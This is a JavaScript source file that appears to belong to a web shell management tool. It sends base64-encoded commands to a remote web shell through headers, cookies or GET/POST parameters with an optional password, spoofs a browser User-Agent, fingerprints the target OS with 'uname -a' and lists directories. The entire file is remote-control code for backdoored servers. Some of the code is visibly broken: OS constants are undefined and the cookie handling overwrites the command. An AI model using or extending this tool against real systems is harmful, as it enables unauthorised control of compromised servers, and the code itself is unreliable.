const axios = require("axios");
const COMMAND_MAP = require("./reqTypes").COMMAND_MAP;
const { LIST_DIR } = require("./reqTypes");
const { parseListDirResponse } = require("./utils");

const generateConfig = (shell, command) => {
	var config = {
		headers: {
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0",
		},
		params: {},
		data: {}
	};

	switch(shell.commandParamType) {
		case "header":
			config["headers"][shell.commandParam] = command;

			if(shell.passwordEnabled) {
				config["headers"][shell.passwordParam] = shell.password;
			}

			break;
		case "cookie":
			config["headers"]["Cookie"] = `${shell.commandParam}=${command}`;

			if(shell.passwordEnabled) {
				config["headers"]["Cookie"] = `${shell.passwordParam}=${shell.password}`;
			}

			break;
		case "POST":
			config["data"][shell.commandParam] = command;			

			if(shell.passwordEnabled) {
				config["data"][shell.passwordParam] = shell.password;
			}

			break;
		case "GET":
			config["params"][shell.commandParam] = command;			

			if(shell.passwordEnabled) {
				config["params"][shell.passwordParam] = shell.password;
			}

			break;
		default:
			console.error("Invalid param type!");
			break;
	}
	
	console.log(config);
	return config;
}

const encodeCommand = (command, shellEncoding) => {
	var encoded = command;

	switch(shellEncoding) {
		case "base64":
			encoded = Buffer.from(command).toString("base64");
			break;
		default:
			console.error("Unsupported command encoding!");
			break;
	}

	return encoded;
}

const sendRequest = async (shell, reqType) => {
	var command = COMMAND_MAP[reqType][shell.os];
	command = encodeCommand(command, shell.commandEncoding);

	const config = generateConfig(shell, command);
	var response;

	if(shell.commandParamType === "POST") {
		response = await axios.post(shell.ipOrHostname, config);
	} else {
		response = await axios.get(shell.ipOrHostname, config);
	}

	return response;
}

const listDir = async (shell) => {
	const response = await sendRequest(shell, LIST_DIR);
	const dir = parseListDirResponse(response);

	return dir;
}

const determineOS = async (shell) => {
	const command = encodeCommand("uname -a", shell.commandEncoding);

	const config = generateConfig(shell, command);
	var response;

	if(shell.commandParamType === "POST") {
		response = await axios.post(shell.ipOrHostname, config);
	} else {
		response = await axios.get(shell.ipOrHostname, config);
	}

	var os = LINUX;

	// Windows does not have `uname`
	if(response.data.body.includes("not recognized")) {
		os = WINDOWS;
	} else if(response.data.body.includes("Linux")) {
		os = LINUX;
	} else {
		os = MAC;
	}

	return os;
};

module.exports = { sendRequest, determineOS, listDir };